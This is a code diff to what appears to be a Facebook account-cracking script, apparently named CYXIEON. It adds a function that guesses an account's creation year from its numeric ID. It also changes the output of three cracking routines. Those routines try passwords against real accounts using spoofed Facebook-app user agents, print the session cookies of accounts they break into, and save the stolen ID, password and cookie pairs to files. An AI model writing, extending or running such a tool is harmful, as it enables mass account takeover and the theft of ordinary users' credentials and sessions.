@@ -26,7 +26,7 @@ except:
 	os.system("pip install requests")
 	os.system("pip install stdiomask")
 
-#----------[ IMPORT-MODULE ]----------#	
+#----------[ IMPORT-RICH ]----------#	
 from bs4 import BeautifulSoup as sop	
 from concurrent.futures import ThreadPoolExecutor as tred
 from rich.console import Console as sol
@@ -95,6 +95,38 @@ def uaku():
 			ua.write(un+'\n')
 		ua=open('.bbnew.txt','r').read().splitlines()
 ua = random.choice(["Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1531.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/411.0.0.13.36;]","Mozilla/5.0 (Linux; Android 10; SM-A700S Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.2114.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/348.0.0.12.57;]","Mozilla/5.0 (Linux; Android 9; Oneplus A99831 Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.1518.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/343.0.0.03.54;]","Mozilla/5.0 (Linux; Android 11; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.2318.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/136.0.0.14.72;]","Mozilla/5.0 (Linux; Android 9; 22041219I Build/TP1A.904992.769; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.1431.179 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/156.0.0.23.66;]","Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.1734.2 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/321.0.0.02.33;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/SD2A.276412.601; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.1576.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/469.0.0.23.21;]","Mozilla/5.0 (Linux; Android 10; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.139.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/334.0.0.15.5;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.2051.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/486.0.0.21.67;]","Mozilla/5.0 (Linux; Android 9; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.78.94 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/218.0.0.15.17;]"])
+
+#--------[ TAHUN-AKUN ]--------#    
+def tahun(fx):
+	if len(fx)==15:
+		if fx[:10] in ['1000000000']       :tahunz = '2009'
+		elif fx[:9] in ['100000000']       :tahunz = '2009'
+		elif fx[:8] in ['10000000']        :tahunz = '2009'
+		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
+		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
+		elif fx[:6] in ['100001']          :tahunz = '2010'
+		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
+		elif fx[:6] in ['100004']          :tahunz = '2012'
+		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
+		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
+		elif fx[:6] in ['100009']          :tahunz = '2015'
+		elif fx[:5] in ['10001']           :tahunz = '2016'
+		elif fx[:5] in ['10002']           :tahunz = '2017'
+		elif fx[:5] in ['10003']           :tahunz = '2018'
+		elif fx[:5] in ['10004']           :tahunz = '2019'
+		elif fx[:5] in ['10005']           :tahunz = '2020'
+		elif fx[:5] in ['10006']           :tahunz = '2021'
+		elif fx[:5] in ['10009']           :tahunz = '2023'
+		elif fx[:5] in ['10007','10008']:tahunz = '2022'
+		else:tahunz=''
+	elif len(fx) in [9,10]:
+		tahunz = '2008'
+	elif len(fx)==8:
+		tahunz = '2007'
+	elif len(fx)==7:
+		tahunz = '2006'
+	else:tahunz=''
+	return tahunz
 			
 #----------[ WARNA-TEMA ]----------#
 puti = '\x1b[1;97m'# WARNA-PUTIH
@@ -498,8 +530,8 @@ def crackvalidate(idf,pwx,url):
 				kukis = kuki.replace(f'c_user={idf};datr','sb')
 				print(f"{kun}╭────────────────────────────╮{puti}")
 				tree = Tree("")
-				tree.add(f"\r{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}").add(f"{hijo}{kuki}{puti}")
-				tree.add(f"{ung}{ua}{puti}")
+				tree.add(f"\r{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}").add(f"{mer}{tahun(idf)}{puti}")
+				tree.add(f"{hijo}{kuki}{puti}").add(f"{mer}{ua}{puti}")
 				print(f"{kun}╰────────────────────────────╯{puti}")
 				prints(tree)
 				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
@@ -508,8 +540,8 @@ def crackvalidate(idf,pwx,url):
 			elif "checkpoint" in CYXIEON_XR.cookies.get_dict().keys():
 				print(f"{kun}╭────────────────────────────╮{puti}")
 				tree = Tree("")
-				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
-				tree.add(f"{ung}{ua}{hijo}")
+				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}").add(f"{mer}{tahun(idf)}{puti}")
+				tree.add(f"{mer}{ua}{hijo}")
 				print(f"{kun}╰────────────────────────────╯{puti}")
 				prints(tree)
 				open('CYXIEON-OK/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
@@ -581,8 +613,8 @@ def crackreguler(idf,pwx,url):
 				kukis = kuki.replace(f'c_user={idf};datr','sb')
 				print(f"{kun}╭────────────────────────────╮{puti}")
 				tree = Tree("")
-				tree.add(f"\r{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}").add(f"{hijo}{kuki}{puti}")
-				tree.add(f"{ung}{ua}{puti}")
+				tree.add(f"\r{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}").add(f"{mer}{tahun(idf)}{puti}")
+				tree.add(f"{hijo}{kuki}{puti}").add(f"{mer}{ua}{puti}")
 				print(f"{kun}╰────────────────────────────╯{puti}")
 				prints(tree)
 				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
@@ -591,8 +623,8 @@ def crackreguler(idf,pwx,url):
 			elif "checkpoint" in CYXIEON_XR.cookies.get_dict().keys():
 				print(f"{kun}╭────────────────────────────╮{puti}")
 				tree = Tree("")
-				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
-				tree.add(f"{ung}{ua}{hijo}")
+				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}").add(f"{mer}{tahun(idf)}{puti}")
+				tree.add(f"{mer}{ua}{hijo}")
 				print(f"{kun}╰────────────────────────────╯{puti}")
 				prints(tree)
 				open('CYXIEON-OK/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
@@ -671,24 +703,24 @@ def crackasyinc(idf,pwx,url):
 				kukis = kuki.replace(f'c_user={idf};datr','sb')
 				print(f"{kun}╭────────────────────────────╮{puti}")
 				tree = Tree("")
-				tree.add(f"\r{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}").add(f"{hijo}{kuki}{puti}")
-				tree.add(f"{ung}{ua}{puti}")
+				tree.add(f"\r{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}").add(f"{mer}{tahun(idf)}{puti}")
+				tree.add(f"{hijo}{kuki}{puti}").add(f"{mer}{ua}{puti}")
 				print(f"{kun}╰────────────────────────────╯{puti}")
 				prints(tree)
 				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
 				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
 				break			
 			elif "checkpoint" in CYXIEON_XR.cookies.get_dict().keys():
-				cp+=1
 				print(f"{kun}╭────────────────────────────╮{puti}")
 				tree = Tree("")
-				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
-				tree.add(f"{ung}{ua}{hijo}")
+				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}").add(f"{mer}{tahun(idf)}{puti}")
+				tree.add(f"{mer}{ua}{hijo}")
 				print(f"{kun}╰────────────────────────────╯{puti}")
 				prints(tree)
 				open('CYXIEON-OK/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 				akune.append(idf+'|'+pw)
 				ceker(idf,pw)
+				cp+=1
 				break	
 				
 			else:
